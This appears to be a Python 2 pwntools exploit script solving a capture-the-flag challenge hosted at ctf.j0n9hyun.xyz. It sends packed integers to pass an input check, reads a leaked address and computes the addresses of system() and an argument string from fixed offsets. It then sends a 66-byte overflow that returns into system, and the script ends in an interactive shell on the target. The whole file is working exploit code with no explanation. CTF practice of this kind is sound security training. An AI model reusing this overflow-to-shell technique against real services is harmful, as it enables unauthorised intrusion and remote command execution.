from pwn import *

r=remote("ctf.j0n9hyun.xyz",3015)
print r.recvuntil(": ")
payload = p32(0x2691f021)*4
payload += p32(0x2691f023)
r.sendline(payload)
print r.recv(64)
print r.recv(34)
addr = int(r.recv(11),16)
log.info("welcome: %#x",addr)
systemoffset = 0xe6e0
systemaddr = addr-systemoffset
sr =0x11000b
sraddr = sr + addr
log.info("systemaddr: %#x",systemaddr)
log.info("sraddr: %#x",sraddr)

payload = "a"*66
payload += p32(systemaddr) + "aaaa"+p32(sraddr)
r.sendline(payload)


r.interactive()
